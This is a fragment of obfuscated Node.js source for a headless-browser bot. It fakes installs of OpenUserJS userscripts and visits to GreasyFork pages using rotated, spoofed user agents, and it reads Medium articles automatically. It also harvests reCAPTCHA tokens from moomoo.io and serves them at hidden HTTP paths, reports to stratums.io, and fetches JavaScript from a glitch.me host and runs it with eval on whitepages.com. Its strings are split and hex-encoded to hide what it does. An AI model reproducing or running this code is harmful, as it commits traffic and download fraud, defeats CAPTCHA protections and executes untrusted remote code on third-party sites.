      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + U(0xe, 'Ys)k') + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + S(0xd) + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    U(0xb, 'evX2') + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + T(0x17) + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + S(0x6) + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0xd77 * -0x2 + -0x1720 + 0x320e
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0xb9b * 0x1 + 0x12be * -0x2 + 0x19e1)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x1 * -0x242d + -0x115 * -0x24 + -0x4abd), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x2b8 + 0xe * 0x282 + -0x2570), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0xb3c + -0xcd8 + 0x19c;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x2697 + 0x1f * 0x67 + 0x1a1e; w < getRandomInt(-0x1d1 * -0xd + -0x239 * -0x1 + -0x185 * 0x11, -0x25c2 + -0x5 * 0x1dc + 0x1 * 0x2f13); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x18055 + -0x12807 + 0x9212);
        }
      }();
    }, -0x9 * 0x1f3 + 0x3 * 0x354 + 0x7f3), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0xa4f + -0x10c + 0x1 * -0x943;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x5a0 + 0x2636 + -0x2096, 0x25a8 + -0xea + -0x248c)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x2908 + -0x6 * 0x1b77 + 0x14302);
    }, 0x1db7 * -0x1 + 0x207c + -0x57 * 0x7), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        const V = b;
        try {
          let s = -0x3 * 0x599 + -0x14aa + 0x2b * 0xdf;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })[V(0x8, '%1rr')](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0xcae + 0x67 * 0x2b + -0x55 * 0x37), await u['evaluate'](() => {
            const W = d;
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + W(0x1a), -0x1bb2 + -0x2 * 0x1381 + 0x42b4), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0xc9 * 0x1105 + 0x643e5 + -0x5e532);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0xcfb * -0x1 + 0x3d5 + 0x2 * -0x836);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x1b2d + -0x151 * -0x4 + -0x1fa9);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x800 + 0x779 * -0x2 + 0x3682);
}
doFlags['doOUJS'] && ((async () => {
  const a0 = d,
    Z = b;
  async function f() {
    const X = c,
      k = h['random'](),
      m = k['replace'](X(0x7), '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x2 * 0x779 + 0x2 * -0x646 + 0x1b7f) {
        const Y = d;
        if (A['includes']('Firefox'))
          return A[Y(0x19)](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x475 * -0x2 + 0x2254 + -0x1 * 0x2b3d));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x2af + 0x1015 * -0x1 + 0x1 * 0xd66, D['indexOf']('\x20'));
        return B ? E['slice'](-0x15f9 + 0x13 * 0x85 + 0xc1a, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x3 * 0x1e7 + -0x55 * -0x4f + 0x720),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x7 * -0xa85 + -0x7de + 0x7891),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + Z(0x3, 'PNMG') + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + a0(0xc) + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x2300 + -0x8bf + -0x1a41; k < -0x176 + -0x1331 + 0x14ab; k++)
    setTimeout(f, (-0x1 * 0x186af + -0x49 * -0xa9 + -0x1c5 * -0x146) * k * getRandomInt(-0x156b + -0x21f * -0xa + -0x2 * -0x1b, 0x29 * 0x57 + 0x14ff + -0x22eb));
  setInterval(() => {
    f();
    for (let l = -0x1 * 0x1e53 + -0x14f * -0x11 + 0x205 * 0x4; l < 0x1543 * 0x1 + 0x13 * -0x161 + -0x4 * -0x13d; l++)
      setTimeout(f, (-0x1c6b4 + 0x1b131 + 0xffe3) * l * getRandomInt(0x52 * -0x8 + 0xa8b + -0x7fa, 0x13 * -0xb + -0x19c + 0x270));
  }, -0x64f334 + -0x22a443 + 0xbe85f7);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const a1 = b,
    f = axios['create']({
      'headers': {
        'User-Agent': userAgents['random']()
      }
    });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents[a1(0x10, 'Yj^k')](),
      'Accept-Encoding': 'none'
    }
